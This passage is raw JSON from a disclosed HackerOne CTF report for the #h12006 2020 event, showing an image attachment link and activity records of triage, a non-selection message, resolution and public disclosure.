6X-Amz-Signature=68255e1adf06ec2068fd8eedb2043311e3183bab3cd9f6000e4cfba05625b385"},{"id":861122,"filename":"payment-3.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MKmQWT9EQRdR6EEnL4FNXQF2?response-content-disposition=attachment%3B%20filename%3D%22payment-3.png%22%3B%20filename%2A%3DUTF-8%27%27payment-3.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1b828434eb96fef48cfdf20bafb6f782d16890124d1627710bf187d0aa351a49"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8247228,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-06-09T20:15:43.299Z","updated_at":"2020-06-09T20:15:43.299Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8268315,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!","automated_response":false,"created_at":"2020-06-11T23:03:06.611Z","updated_at":"2020-06-11T23:03:06.611Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8324968,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","automated_response":false,"created_at":"2020-06-17T22:28:17.048Z","updated_at":"2020-06-17T22:28:17.048Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"shakedko","url":"/shakedko"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8343078,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any chance to disclose \u0026 make public? \n\nThank you!","automated_response":false,"created_at":"2020-06-19T13:42:38.786Z","updated_at":"2020-06-19T13:42:38.786Z","actor":{"username":"shakedko","cleared":false,"url":"/shakedko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ak1oSZijBCAPDuMVcNi2Mosb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8344642,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-19T16:11:07.663Z","updated_at":"2020-06-19T16:11:07.663Z","first_to_agree":true,"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8516343,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2020-07-06T16:02:30.957Z","updated_at":"2020-07-06T16:02:30.957Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}